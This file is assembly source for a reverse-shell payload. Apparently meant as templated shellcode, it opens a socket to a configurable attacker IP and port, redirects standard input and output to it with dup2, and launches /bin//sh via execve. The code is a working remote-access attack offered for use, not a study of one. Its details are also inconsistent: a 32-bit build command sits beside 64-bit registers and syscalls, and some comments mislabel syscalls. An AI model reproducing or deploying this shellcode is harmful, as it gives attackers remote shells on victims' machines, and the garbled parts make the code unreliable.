; compile : nasm -f elf32 reverser_shellcode_no_segfault.asm && ld -m elf_i386 reverser_shellcode_no_segfault.o -o reverseshell
global      _start

section .text

    IP_ADDRESS  equ     -ip_address-    ; 0xfeffff80
    PORT        equ     -port-          ; 0x901F
    AF_INET     equ     0x2
    SOCK_STREAM equ     0x1


    SOCKET      equ     0x29
    CONNECT     equ     0x2a
    DUP         equ     0x21
    EXECVE      equ     0x3b
    EXIT        equ     0x1

_start:
; We first need to create a socket
; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
    mov         al, SOCKET      ; socketcall (102)
    push        AF_INET
    pop         rdi
    push        SOCK_STREAM
    pop         rsi
    xor         edx, edx
    syscall                     ; execute
    mov         r9, rax

; Then connect to ip and port
    xchg        rdi, rax
    xor         rcx, rcx
    mov         ebx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
    xor         ebx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
    push        rcx
    push        rcx
    push        rbx
    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
    push        word AF_INET    ; AF_INET (2)
    mov         rsi, rsp
    push        byte 0x10
    pop         rdx

    mov         rbx, rdi
    mov         al, CONNECT
    syscall             ; execute
    inc         eax
    cmp         eax, 1
    jne         fail
    jmp         continue

fail:
    xor         rbx, rbx
    xor         rax, rax
    mov         al, EXIT
    syscall

continue:
; Get input and redirect output
    push        byte 0x02
    pop         rsi
    mov         rdi, r9

loop:
    push        DUP
    pop         rax
    syscall
    dec         rsi
    jns         loop

; Execute a shell
    xor         rdx, rdx
    push        rdx
    push        rdx
    mov         rbx, 0x68732f6e69622f2f
    push        rbx
    mov         rdi, rsp
    push        rdx
    push        rdi
    mov         rsi, rsp
    
    mov         al, EXECVE
    syscall